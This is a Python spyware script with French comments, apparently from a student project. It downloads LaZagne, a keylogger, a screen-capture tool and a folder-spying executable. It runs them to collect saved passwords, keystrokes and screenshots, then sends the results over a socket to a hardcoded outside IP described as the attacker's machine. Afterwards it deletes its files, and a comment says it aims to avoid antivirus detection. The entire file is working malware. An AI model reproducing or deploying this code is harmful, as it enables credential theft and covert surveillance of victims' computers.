#!/usr/bin/python3
# coding: utf-8

import wget
import subprocess
import shlex
import time
import socket
import os
import struct

#information sur le routeur intermédiaire
serveur_ip = "86.246.41.192"
port = 9001

#lien de téléchargement
url_lazagne = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"
url_dossierSpy = "https://github.com/ZycAlix/Projet-Spyware/blob/master/dossierSpy.exe?raw=true"
url_keylogger = "https://github.com/ZycAlix/Projet-Spyware/blob/master/keylogger.exe?raw=true"
url_screencapture = "https://github.com/ZycAlix/Projet-Spyware/blob/master/screencapture3.exe?raw=true"

liste_url = [url_lazagne, url_dossierSpy, url_keylogger, url_screencapture]

#Ces booleens permette de savoir si les fichier de sorties sont prêts.
#Quand ces fichiers seront prêt ils seront envoyé par le client au serveur distant.
dossierSpy_out_rdy = False
lazagne_out_rdy = False
keylogger_out_rdy = False
screencapture_out_rdy = False
#screencapture_out_rdy = False

def socket_client():
    """
    La fonction permet d'exfiltrer les données récoltées vers le serveurs de la machine malveillante.
    L'ordinateur rentre en contact avec l'ordinateur malveillant par l'intermédiaire d'un routeur qui redirige les connexions entrantes.
    """
    try:
        print("\nDebut de l'exfiltration\n")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((serveur_ip, port))
        print("[+] Connexion réussi !")
    except socket.error as err:
        print(err)
        exit()
    print(s.recv(1024))

    #Transfert des fichiers textuels et image de capture d'écran
    print("Transfert en cours...")
    liste_path = ['dossier_out.txt', 'lazagne_out.txt', 'keylogger_out.txt','capture.jpg']
    for filepath in liste_path:
        if os.path.isfile(filepath):
            fileinfo_size = struct.calcsize('128sl')
            fhead = struct.pack('128sl', os.path.basename(filepath).encode('utf-8'), os.stat(filepath).st_size)
            s.send(fhead)
            fp = open(filepath, 'rb')
            while True:
                data = fp.read(1024)
                if not data:
                    print ('{0} file send over...'.format(os.path.basename(filepath)))
                    break
                s.send(data)

    print("Les fichiers ont été envoyés avec succès !")

def attendre(nb_secondes):
    print("Attente de : " + str(nb_secondes) + "secondes...")
    for i in range(1, nb_secondes):
        time.sleep(1)
        print(str(wait-i) + "secondes restantes")

def telecharger_exe(liste_url):
    #Télécharge les executables des logiciels
    for url in liste_url:
        print("\n[!] Téléchargement du programme...")
        filename = wget.download(url)
        print("\n[!] Programme téléchargé avec succès : " + filename)

def fichiers_prets():
    return dossierSpy_out_rdy and lazagne_out_rdy and keylogger_out_rdy and screencapture_out_rdy


#On fait attendre le programme quelques secondes afin d'éviter une détection AV
attendre(0)

#On execute les programmes
#On télécharge les programmes malveillants
telecharger_exe(liste_url)

#On récupère les sorties des programmes dans des fichiers

cmd = "lazagne.exe all"
with open("lazagne_out.txt", "w") as out:
	subprocess.run(shlex.split(cmd), stdout=out, shell=True)
	print("Programme Lazagne terminé avec succès !")
time.sleep(60)
lazagne_out_rdy = True

#Execution de l'executable dossierSpy
cmd = "start dossierSpy.exe"
subprocess.run(shlex.split(cmd), shell=True)
print("Programme dossierSpy terminé avec succès !")
dossierSpy_out_rdy = True

#Execution de l'executable screencapture
cmd = "start screencapture3.exe"
subprocess.run(shlex.split(cmd), shell=True)
print("Programme screencaputure terminé avec succès !")
screencapture_out_rdy = True


#Execution de l'executable keylogger
cmd = "start keylogger.exe"
subprocess.run(shlex.split(cmd), shell=True)
print("Programme Keylogger terminé avec succès !")
time.sleep(10)

#Éliminer le processus après l'exécution du virus
cmd = "taskkill /f /im keylogger.exe"
subprocess.run(shlex.split(cmd), shell=True)

keylogger_out_rdy = True

if fichiers_prets():
    socket_client()


cmd = "del capture.jpg"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del keylogger_out.txt"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del lazagne_out.txt"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del dossier_out.txt"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del lazagne.exe"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del dossierSpy.exe"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del screencapture3.exe"
subprocess.run(shlex.split(cmd), shell=True)
cmd = "del keylogger.exe"
subprocess.run(shlex.split(cmd), shell=True)


